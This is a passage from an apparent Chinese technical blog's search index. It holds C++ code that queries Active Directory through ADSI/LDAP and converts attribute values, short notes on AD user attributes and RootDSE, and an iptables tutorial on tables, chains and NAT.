(SUCCEEDED(hr)) &#123; hr = pNto-&gt;Get(ADS_NAME_TYPE_NT4, &amp;bstr); wprintf(L&quot; %s\\r\\n&quot;, bstr); SysFreeString(bstr); &#125; pNto-&gt;Release(); &#125; &#125; else &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].DNString); &#125; &#125; break; case ADSTYPE_CASE_EXACT_STRING: case ADSTYPE_CASE_IGNORE_STRING: case ADSTYPE_PRINTABLE_STRING: case ADSTYPE_NUMERIC_STRING: case ADSTYPE_TYPEDNAME: case ADSTYPE_FAXNUMBER: case ADSTYPE_PATH: case ADSTYPE_OBJECT_CLASS: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].CaseIgnoreString); &#125; break; case ADSTYPE_BOOLEAN: for (x = 0; x&lt; col.dwNumValues; x++) &#123; dwBool = col.pADsValues[x].Boolean; pszBool = dwBool ? L&quot;TRUE&quot; : L&quot;FALSE&quot;; wprintf(L&quot; %s\\r\\n&quot;, pszBool); &#125; break; case ADSTYPE_INTEGER: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %d\\r\\n&quot;, col.pADsValues[x].Integer); &#125; break; case ADSTYPE_OCTET_STRING: if (_wcsicmp(col.pszAttrName, L&quot;objectSID&quot;) == 0) &#123; for (x = 0; x&lt; col.dwNumValues; x++) &#123; pObjectSID = (PSID)(col.pADsValues[x].OctetString.lpValue); // Convert SID to string. ConvertSidToStringSid(pObjectSID, &amp;szSID); wprintf(L&quot; %s\\r\\n&quot;, szSID); LocalFree(szSID); &#125; &#125; else if ((_wcsicmp(col.pszAttrName, L&quot;objectGUID&quot;) == 0)) &#123; for (x = 0; x&lt; col.dwNumValues; x++) &#123; // Cast to LPGUID pObjectGUID = (LPGUID)(col.pADsValues[x].OctetString.lpValue); // Convert GUID to string. ::StringFromGUID2(*pObjectGUID, szDSGUID, 39); // Print the GUID wprintf(L&quot; %s\\r\\n&quot;, szDSGUID); &#125; &#125; else wprintf(L&quot; Value of type Octet String. No Conversion.\\n&quot;); break; case ADSTYPE_UTC_TIME: for (x = 0; x&lt; col.dwNumValues; x++) &#123; systemtime = col.pADsValues[x].UTCTime; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; // Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else wprintf(L&quot;[!] Could not convert UTC-Time.\\n&quot;); &#125; break; case ADSTYPE_LARGE_INTEGER: for (x = 0; x&lt; col.dwNumValues; x++) &#123; liValue = col.pADsValues[x].LargeInteger; filetime.dwLowDateTime = liValue.LowPart; filetime.dwHighDateTime = liValue.HighPart; if ((filetime.dwHighDateTime == 0) &amp;&amp; (filetime.dwLowDateTime == 0)) &#123; wprintf(L&quot; No value set.\\n&quot;); &#125; else &#123; // Check for properties of type LargeInteger that represent time // if TRUE, then convert to variant time. if ((0 == wcscmp(L&quot;accountExpires&quot;, col.pszAttrName)) | (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lastLogon&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lastLogoff&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;lockoutTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;pwdLastSet&quot;, col.pszAttrName)) ) &#123; // Handle special case for Never Expires where low part is -1 if (filetime.dwLowDateTime == -1) &#123; wprintf(L&quot; Never Expires.\\n&quot;); &#125; else &#123; if (FileTimeToLocalFileTime(&amp;filetime, &amp;filetime) != 0) &#123; if (FileTimeToSystemTime(&amp;filetime, &amp;systemtime) != 0) &#123; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; // Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else &#123; wprintf(L&quot; FileTimeToVariantTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToSystemTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToLocalFileTime failed\\n&quot;); &#125; &#125; &#125; else &#123; // Print the LargeInteger. wprintf(L&quot; high: %d low: %d\\r\\n&quot;, filetime.dwHighDateTime, filetime.dwLowDateTime); &#125; &#125; &#125; break; case ADSTYPE_NT_SECURITY_DESCRIPTOR: for (x = 0; x&lt; col.dwNumValues; x++) &#123; wprintf(L&quot; Security descriptor.\\n&quot;); &#125; break; default: wprintf(L&quot;[!] Unknown type %d.\\n&quot;, col.dwADsType); &#125; pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; CoTaskMemFree(pszColumn); &#125; // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) hr = S_FALSE; wprintf(L&quot;--------------------------------------------------------------------\\n&quot;); return hr;&#125;void wmain(int argc, wchar_t *argv[])&#123; if (argc != 4) &#123; printf(&quot;\\nThis program queries for objects in the current user&#x27;s domain.\\n&quot;); printf(&quot;Usage:\\n&quot;); printf(&quot; %ws &lt;ADS path&gt; &lt;search string&gt; &lt;outputdata&gt;\\n&quot;, argv[0]); printf(&quot;Eg.\\n&quot;); printf(&quot; %ws Current \\&quot;(&amp;(objectClass=user)(objectCategory=person))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=computer)(objectClass=computer))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws \\&quot;OU=Domain Controllers,DC=test,DC=com\\&quot; \\&quot;(&amp;(objectCategory=computer)(objectClass=computer))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=group))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=organizationalUnit))\\&quot; ShortData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectClass=user)(objectCategory=person)(name=testa))\\&quot; AllData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=computer)(objectClass=computer)(name=COMPUTER01))\\&quot; AllData\\n&quot;, argv[0]); printf(&quot; %ws Current \\&quot;(&amp;(objectCategory=group)(name=Domain Admins))\\&quot; AllData\\n&quot;, argv[0]); return; &#125; int maxAlloc = MAX_PATH * 2; LPOLESTR pszBuffer = new OLECHAR[maxAlloc]; wcscpy_s(pszBuffer, maxAlloc, L&quot;&quot;); if (IS_BUFFER_ENOUGH(maxAlloc, pszBuffer, argv[2]) &gt; 0) &#123; wcscpy_s(pszBuffer, maxAlloc, argv[2]); &#125; else &#123; wprintf(L&quot;Buffer is too small for the argument&quot;); delete[] pszBuffer; return; &#125; BOOL bReturnVerbose = FALSE; if (_wcsicmp(argv[3], L&quot;AllData&quot;) == 0) &#123; bReturnVerbose = TRUE; &#125; CoInitialize(NULL); HRESULT hr = S_OK; // Get rootDSE and the current user&#x27;s domain container DN. IADs *pObject = NULL; IDirectorySearch *pContainerToSearch = NULL; LPOLESTR szPath = new OLECHAR[MAX_PATH]; VARIANT var; hr = ADsOpenObject(L&quot;LDAP://rootDSE&quot;, NULL, NULL, ADS_SECURE_AUTHENTICATION, // Use Secure Authentication IID_IADs, (void**)&amp;pObject); if (FAILED(hr)) &#123; wprintf(L&quot;[!] Could not execute query. Could not bind to LDAP://rootDSE.\\n&quot;); if (pObject) pObject-&gt;Release(); delete[] pszBuffer; delete[] szPath; CoUninitialize(); // Flush STDOUT fflush(stdout); return; &#125; if (SUCCEEDED(hr)) &#123; hr = pObject-&gt;Get(L&quot;defaultNamingContext&quot;, &amp;var); if (SUCCEEDED(hr)) &#123; wcscpy_s(szPath, MAX_PATH, L&quot;LDAP://&quot;); if (_wcsicmp(argv[1], L&quot;Current&quot;) == 0) &#123; // Build path to the domain container. if (IS_BUFFER_ENOUGH(MAX_PATH, szPath, var.bstrVal) &gt; 0) &#123; wcscat_s(szPath, MAX_PATH, var.bstrVal); &#125; else &#123; wprintf(L&quot;[!] Buffer is too small for the domain DN&quot;); delete[] pszBuffer; delete[] szPath; CoUninitialize(); // Flush STDOUT fflush(stdout); return; &#125; &#125; else &#123; if (IS_BUFFER_ENOUGH(MAX_PATH, szPath, argv[1]) &gt; 0) &#123; wcscat_s(szPath, MAX_PATH, argv[1]); &#125; &#125; wprintf(L&quot;%s\\n&quot;, szPath); hr = ADsOpenObject(szPath, NULL, NULL, ADS_SECURE_AUTHENTICATION, // Use Secure Authentication IID_IDirectorySearch, (void**)&amp;pContainerToSearch); if (SUCCEEDED(hr)) &#123; hr = Search(pContainerToSearch, //IDirectorySearch pointer to Partitions container. pszBuffer, NULL, bReturnVerbose ); if (SUCCEEDED(hr)) &#123; if (S_FALSE == hr) wprintf(L&quot;[!] No object could be found.\\n&quot;); &#125; else if (0x8007203e == hr) wprintf(L&quot;[!] Could not execute query. An invalid filter was specified.\\n&quot;); else wprintf(L&quot;[!] Query failed to run. HRESULT: %x\\n&quot;, hr); &#125; else &#123; wprintf(L&quot;[!] Could not execute query. Could not bind to the container.\\n&quot;); &#125; if (pContainerToSearch) pContainerToSearch-&gt;Release(); &#125; VariantClear(&amp;var); &#125; if (pObject) pObject-&gt;Release(); delete[] pszBuffer; delete[] szPath; // Uninitialize COM CoUninitialize(); // Flush STDOUT fflush(stdout);&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"AD","slug":"AD","permalink":"http://example.com/tags/AD/"},{"name":"域","slug":"域","permalink":"http://example.com/tags/%E5%9F%9F/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"}]},{"title":"【AD】用户属性","date":"2024-01-19T04:06:36.814Z","path":"A_OS/Windows/AD/【AD】用户属性/","text":"概述：AD 用户属性 参考链接： 用户对象属性 - Win32 apps | Microsoft Learn 用户账户状态UserAccountControl 属性标志 - Windows Server | Microsoft Learn","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"AD","slug":"AD","permalink":"http://example.com/tags/AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"}]},{"title":"【AD】相关函数调用","date":"2024-01-19T03:03:21.586Z","path":"A_OS/Windows/AD/【AD】相关函数调用/","text":"概述： AD 调用函数中相关函数的使用整理 0x01 时间转换相关链接： FileTimeToSystemTime 函数 (timezoneapi.h) - Win32 apps | Microsoft Learn 如何将 Active Directory 中的日期&#x2F;时间属性转换为标准时间格式 - Windows Server | Microsoft Learn 12345678910111213if (_wcsicmp(col.pszAttrName, L&quot;lastLogon&quot;) == 0)&#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strLastLogon = sTime; &#125; uAccount.tmLastLogon = col.pADsValues-&gt;Timestamp.WholeSeconds;&#125; 0x02 封装函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132typedef struct _USERACCOUNT&#123; std::string UserName; // 用户名 std::string strDomain; // 所在域 std::string strGroup; // 所在组 std::string strSID; // SID std::string strHomePath; // home bool bDisabled; // 是否禁用 bool bAdmin; // 是否管理员 __time64_t tmLastLogon; // 最后登录时间 std::string strLastLogon; // 最后登录时间 unsigned int dwPwStatus; // 密码状态， 已设置 1， 空密码 2， 已锁定 3 域用户：1 需要密码 2 无需密码 std::string strPwdChangeTime; // 密码修改时间 std::string strPwdExpireTime; // 密码过期时间 std::string strAccountType; // 1 本地账户，2全局账户 3 域用户 std::string strIsDomain; // 1 是，2不是&#125;UserAccount;inline void ConvertColToUAStruct(const ADS_SEARCH_COLUMN&amp; col, UserAccount&amp; uAccount)&#123; DWORD x = 0; if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;sAMAccountName&quot;) == 0) &#123; uAccount.UserName = col.pADsValues-&gt;CaseIgnoreString; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_INTEGER) &#123; if (_wcsicmp(col.pszAttrName, L&quot;userAccountControl&quot;) == 0) &#123; uAccount.bDisabled = ((col.pADsValues-&gt;Integer &amp; ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE; if ((ADS_UF_PASSWD_NOTREQD &amp; col.pADsValues-&gt;Integer) == ADS_UF_PASSWD_NOTREQD) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_EMPTY; &#125; else if ((ADS_UF_LOCKOUT &amp; col.pADsValues-&gt;Integer) == ADS_UF_LOCKOUT) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_LOCK; &#125; else &#123; uAccount.dwPwStatus = PASSWORD_TYPE_REQ; &#125; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;ms-DS-User-Account-Control-Computed&quot;) == 0) &#123; uAccount.bDisabled = ((col.pADsValues-&gt;Integer &amp; ADS_UF_ACCOUNTDISABLE) == ADS_UF_ACCOUNTDISABLE) ? TRUE : FALSE; if ((ADS_UF_LOCKOUT &amp; col.pADsValues-&gt;Integer) == ADS_UF_LOCKOUT) &#123; uAccount.dwPwStatus = PASSWORD_TYPE_LOCK; &#125; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;maxPwdAge&quot;) == 0) &#123; CStringW strTime; DWORD Days = col.pADsValues-&gt;LargeInteger.QuadPart / 1000 / 1000 / 1000 / 60 / 60 / 24; strTime.Format(L&quot;%d day(s)&quot;, Days); uAccount.strPwdExpireTime = strTime; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;lastLogonTimestamp&quot;) == 0) &#123; ADS_LARGE_INTEGER strValue = col.pADsValues-&gt;LargeInteger; uAccount.tmLastLogon = strValue.QuadPart; &#125; &#125; else if (col.dwADsType == ADSTYPE_LARGE_INTEGER) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;lastLogon&quot;) == 0) &#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strLastLogon = sTime; &#125; uAccount.tmLastLogon = col.pADsValues-&gt;Timestamp.WholeSeconds; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;pwdLastSet&quot;) == 0) &#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strPwdChangeTime = sTime; &#125; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_OCTET_STRING) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;objectSid&quot;) == 0) &#123; PSID pObjectSID = NULL; LPWSTR lpSID = NULL; pObjectSID = (PSID)(col.pADsValues[x].OctetString.lpValue); // Convert SID to string. ConvertSidToStringSidW(pObjectSID, &amp;lpSID); uAccount.strSID = lpSID; if (lpSID) &#123; LocalFree(lpSID); &#125; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_BOOLEAN) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;isCriticalSystemObject&quot;) == 0) &#123; uAccount.bAdmin = col.pADsValues-&gt;Boolean; &#125; &#125; &#125;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"}]},{"title":"【AD】RootDSE","date":"2024-01-19T02:40:59.588Z","path":"A_OS/Windows/AD/【AD】RootDSE/","text":"概述：RootDSE 属性描述及使用 参考链接： RootDSE (AD 架构) - Win32 apps | Microsoft Learn 0x01 roorDSErootDSE 是每个目录服务器上的已知可靠位置，用于获取域、架构和配置容器的可分辨名称，以及有关服务器及其目录数据树内容的其他数据。 这些属性很少在特定服务器上发生更改。 应用程序可以在启动时读取这些属性，并在整个会话中使用它们。 总之，应用程序应使用无服务器绑定绑定到当前域上的目录，使用 rootDSE 获取命名空间的可分辨名称，并使用该可分辨名称绑定到命名空间中的对象。 在 LDAP 3.0 中，rootDSE 定义为目录服务器上的目录数据树的根。 rootDSE 不属于任何命名空间。 rootDSE 的用途是提供有关目录服务器的数据。 下面是用于绑定到 rootDSE 的绑定字符串。 1LDAP://&lt;servername&gt;/rootDSE servername &lt;&gt; 是服务器的 DNS 名称。 servername &lt;&gt; 是可选的，如以下格式所示。 1LDAP://rootDSE 0x02 rootDSE的使用参考代码：C2-Tool-Collection&#x2F;BOF&#x2F;SprayAD&#x2F;SOURCE&#x2F;SprayAD.c at e371a38c717edaf1650923575ab33bee0dd3e0ee · outflanknl&#x2F;C2-Tool-Collection 12345678910hr = ADsOpenObject(L&quot;LDAP://rootDSE&quot;, NULL, NULL, ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption IADsIID, (void**)&amp;pRoot); if (FAILED(hr)) &#123; Debug_ErrorStr(L&quot;Failed to get rootDSE.\\n&quot;); goto CleanUp; &#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"}]},{"title":"【Linux防火墙】iptables","date":"2024-01-16T06:22:10.861Z","path":"A_OS/Linux/Linux防火墙/iptables/","text":"概述：随着网络的逐渐普及，人们对其的需求越来越强，各种服务，平台应运而生，而平台与服务在公网的暴露也增加了受攻击的风险，而 Linux 中的最重要的守护神 iptables 的地位也显得越来越重要。本实验将带大家初识 iptables。当然学习本实验之前有一定的网络基础知识能够帮助理解。 实验涉及的知识点 iptables 的发展 iptables 的结构 iptables 的使用 0x01 iptables 的发展上个实验中我们了解到，防火墙也就是工作在主机或者网络边缘，对进出的报文按事先设定的规则进行检查，并对匹配的数据包做出处理的一组硬件或者是软件，设置软硬件的结合体。 而在 Linux 的中的防火墙当然也就是那么一组软件对数据包的处理，Linux 中的防火墙主要是进行一些包的过滤，而这套防火墙也不是一开始便如此的强大，是这样的一个发展过程： Linux内核2.0： ipfwadm Linux内核2.2： ipchains Linux内核2.4： iptables 而为什么随着内核版本的升级，我们的使用的防火墙也在不断地变化，首先 ipchains 相较于 ipfwadm 有这样一些优势： Qos（Quality of service）的支持 ipchains 是树形结构的链，而 ipfwadm 是线性的结构，树形结构能够做到在自己拥有链的情况下再去接受其他跳转过来的链 ipchains 比 ipfwadm 在配置上更加的灵活 ipchains 可以明确地过滤任何的 ip 协议，不仅仅是 TCP、UDP、ICMP 而 iptables 之所以能够替代 ipchains 是因为它具有以下一些优势： 可以追踪有状态的 IPV4 的协议与应用 可以追踪有状态的 IPV6 的协议 能够做到 NAT 的 一对多与多对多 内建的 PORTFW 功能 若想了解很多的信息可以在这里看到 iptables 就是目前工作于较新版（内核版本高过2.4的） Linux 内核中的强大的数据包过滤的软件，它主要是由两部分组成 iptalbes：主要工作于用户空间，为用户提供了一个编辑规则的接口。 netfilter：主要工作于内核空间，是内核的一部分，由一些过滤表组成。 netfilter 工作于系统的内核空间，最底层的工作，所以真正令过滤规则生效的并不是 iptables 而是 netfilter，而 iptables 工作在 netfilter之上，是一个让用户编写规则的工具。 netfilter&#x2F;iptables 是 Rusty Russell 在1998年就开始写的一个项目，netfilter 是 Linux 内核中的一个框架，因 Linux 拥有高模块化的内核，所以 Linux 很多功能都以模块形式存在，而模块化的设计最大的优点在于“弹性”，我们可以通过Linux的模块管理工具，随心所欲地将模块载入内存与移除内存，因此 Netfilter 也是以模块的形式存在于 Linux 中。，采用极度模块化的设计，使其的拥有更好的扩充性以及很强的灵活性，提供一种特定的方式实现定制的模块，允许各种网络相关的操作。iptables 这个应用层的程序便是调用它的接口实现规则的修改。 （此图来源于：[维基百科](https://en.wikipedia.org/wiki/Netfilter)) 0x02 iptables 的结构Netfilter 所设置的规则是存放在内存中的，而 iptables 通过 Netfilter 放出的内核接口 ip_tables 来对存放在内存中的 Netfilter 配置表进行修改。这个配置表主要由 tables、chains、target 组成。 此图片来源于http://byrev.space/free/wp-content/uploads/sites/3/iptables-linux.png 其中表主要有这四张： filter表 NAT表 mangle表 raw表 每个表中可以用的 chains 不全相同，当然 iptables 支持新建 chains，而 chains 是 Netfilter 框架中制定的对数据包的 Hook Point，Hook Point 是一个数据包通过网卡流经系统内核相应的位置时会对数据包的流向做出一定的修改，在系统上存在5个 Hook Point 的挂载点 PREROUTING INPUT OUTPUT FORWARD POSTROUTING target 中大部分是通用的，当然有部分是特定使用的，这里只列举常用的几种规则，更多的规则大家可以使用 man 来查看 ACCEPT：一旦包满足了指定的匹配条件，就会通过，并且不会再去匹配当前链中的其他规则或同一个表内的其他规则，但它还要通过其他表中的链 DROP：一旦包满足了指定的匹配条件，将会把该包丢弃，也就是说包的生命到此结束，不会再向前走一步，效果就是包被阻塞了。不会返回任何的消息 REJECT和DROP基本一样，一旦包满足了指定的匹配条件，将会把该包丢弃，但是它除了阻塞包之外，还向发送者返回错误信息。 SNAT：一旦包满足了指定的匹配条件，源网络地址转换 DNAT：一旦包满足了指定的匹配条件，目的网络地址转换 MASQUERADE和SNAT的作用相同，区别在于它不需要指定–to-source REDIRECT：一旦包满足了指定的匹配条件，转发数据包一另一个端口 RETURN：一旦包满足了指定的匹配条件，使数据包返回上一层 MIRROR：颠倒IP头部中的源目地址，然后再转发包 0x03 filter表的认识其中 filter 表的主要作用就是对数据包的过滤，访问控制（相类似的有思科自己开发的 ACL）。该表下有三个规则链： INPUT 链：INPUT 针对那些从外进入本地，也就是目的地是本地的包 FORWARD 链：FORWARD 针对所有不是本地产生的并且目的地不是本地(即本机只是负责转发)的包 OUTPUT 链：OUTPUT 是用来针对所有本地生成的包 在内核中使用 iptables_filter 这个模块，在代码中各模块都是相对独立的初始化，此模块的初始化在源码 net/ipv4/netfilter/iptable_filter.c –&gt;iptable_filter_init 中，我们可以在 filter 的初始化函数 iptables_filter_init 中我们可以看到注册 Hook point 的函数接口 nf_register_hooks 中是这样写的 1234567891011121314151617181920212223242526static struct nf_hook_ops ipt_ops[] __read_mostly = &#123; #这是注册的INPUT的链 &#123; .hook = ipt_local_in_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_LOCAL_IN, .priority = NF_IP_PRI_FILTER, &#125;, #这是注册的FORWARD的链 &#123; .hook = ipt_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_FORWARD, .priority = NF_IP_PRI_FILTER, &#125;, #这里注册的是OUTPUT的链 &#123; .hook = ipt_local_out_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_LOCAL_OUT, .priority = NF_IP_PRI_FILTER, &#125;,&#125;; 并且最终的调用的代码中也都调用到了 1234567/* Returns one of the generic firewall policies, like NF_ACCEPT. */unsigned intipt_do_table(struct sk_buff *skb, unsigned int hook, const struct net_device *in, const struct net_device *out, struct xt_table *table) 由此我们了解到在 filter 初始化的时候便是只注册了三个 Hook point，当然我们可以修改源码做自己定制化的 filter，这里便不再过多地深入了，有兴趣的同学可以去 netfilter 的官网下载源码研究研究 0x04 NAT表的认识其中 NAT（Network Address Translation） 表主要用于修改数据包的报头的 IP 地址、端口号等信息。可以实现数据包伪装、平衡负载、端口转发和透明代理。该表包含三个链： NAT 是一种把内部网络的 ip 地址转换为合法的公网 ip 地址，当私有网主机和公共网主机通信的IP包经过NAT网关时，将 IP 包中的源IP或目的 IP 在私有 IP 和 NAT 的公共 IP 之间进行转换。能够有效的解决公网地址不足的问题，在一定程度上起到安全的作用 PREROUTING 链：作用是在包刚刚到达本机时，路由之前改变它的目的地址 OUTPUT 链：改变本地产生的包的目的地址 POSTROUTING 链：在包就要离开防火墙之前改变其源地址 我们可以通过这样一张图来了解到 Header 中的信息什么样的，NAT 具体修改的内容 NAT 分为三种类型 静态 NAT（static NAT）：ip 地址在转换时是一种一对一的关系 动态 NAT（dynamic NAT 或者叫 pooled NAT）： ip 地址在转换时是一种多对多的关系 NPAT（Network Address Port Translation）：网络地址端口转换在 ip 地址的层面上来说是属于一种多对一的关系 NPAT是把内部地址映射到外部网络的一个IP地址的不同端口上，，但是这里虽然是将多个内网 ip 地址转换为一个公网地址，但是这里的地址是公网地址+端口号的形式，而不是简单的一个公网地址。 在 iptables 中我们比较常用 NPAT 的形式，而 NPAT 又细分为以下的两种： 源 NAT（SNAT，Source NAT）修改数据包的源地址。源NAT改变数据流的第一个数据包的来源地址，数据包伪装就是一具SNAT的例子。 目的 NAT（DNAT，Destination NAT）修改数据包的目的地址。它是改变第一个数据包的目的地地址，如平衡负载、端口转发和透明代理就是属于 DNAT。 若是要做 SNAT 的数据包需要添加到 POSTROUTING 链中。要做 DNAT 的数据包需要添加到 PREROUTING 链中。直接从本地出站的信息包的规则被添加到 OUTPUT 链中。 因为 SNAT 是修改的源地址，然后通过发送出去，给其他的网络设备解读，所以必须在发送出去之前进行 SNAT。所以数据包是送往 POSTROUTING 链，并且匹配了规则，则执行 DNAT 或 REDIRECT 目标。便可在路由之后修改源地址了。 因为 DNAT 是修改的目的地址，然后通过路由转发出去，为了使数据包得到正确路由，必须在路由之前进行 DNAT。所以数据包是送往 PREROUTING 链，并且匹配了规则，则执行 DNAT 或 REDIRECT 目标。便可在路由之前修改目的地址了。 路由是内核检查数据包的报头信息 但是 NAT 也不是完美的，它也是有缺陷的，如我们在使用 VPN 的时候便是对数据的加密，而若是数据包的信息被修改过，该包将被丢弃，所以需要 NAT 穿透技术，感兴趣的可以更深入的研究。 0x05 mangle表的认识其中 mangle 表主要用于修改数据包的 TOS（Type Of Service，服务类型，根据不同的服务质量。来选择经过路由的路径）、TTL（Time To Live，生存周期，每经过一个路由器将减1，mangle 可以修改此值设定TTL要被增加的值，这个选项可以使我们的防火墙更加隐蔽，而不被 trace-routes 发现等等）以及为数据包设置 Mark 标记（特殊标记，用来做高级路由，以使不同的包能使用不同的队列要求，等等），Qos(Quality Of Service，服务质量)调整以及策略路由等应用，由于 TOS，Qos 类似的方式需要相应的路由设备支持，所以应用并不广泛。这里不做过多的讲解，这个表中包含五个规则链：PREROUTING，POSTROUTING，INPUT，OUTPUT，FORWARD。 0x06 raw 表的认识raw 表是自1.2.9以后版本的 iptables 新增的表，主要用于决定数据包是否被状态跟踪机制处理。在匹配数据包时，raw 表的规则要优先于其他表。包含两条规则链：OUTPUT、PREROUTING 0x07 数据包的状态iptables中数据包被跟踪连接有4种不同状态： NEW：该包想要开始一个连接（重新连接或将连接重定向） RELATED：该包是属于某个已经建立的连接所建立的新连接。例如：–icmp-type 0 ( ping 应答) 就是–icmp-type 8 (ping 请求)所RELATED出来的。 ESTABLISHED ：只要发送并接到应答，一个数据连接从NEW变为 ESTABLISHED ,而且该状态会继续匹配这个连接的后续数据包。 INVALID：数据包不能被识别属于哪个连接或没有任何状态比如内存溢出，收到不知属于哪个连接的 ICMP 错误信息，一般应该 DROP 这个状态的任何数据。 我们对每一张表以及每一个链都有了一个大体上的认识，我们可以通过这样一张表了解到我们的数据包在我们的内核中是怎样的一个前进的过程，到底要经过多少次审核，多少个关卡 从这张图中我们可以了解到每个数据包的进与出都会经历这样的一个流程 当有数据包进入网卡时，数据包首先到 PREROUTING 链中，若是有表对应的表匹配，首先应该是到 raw 中，然后到 mangle 中最后到 NAT 的 PREROUTING 链中，上文我们也提过PREROUTING 链中我们有机会在到内核的路由模块之前修改数据包的目的 IP ，然后内核的”路由模块”根据数据包目的 IP 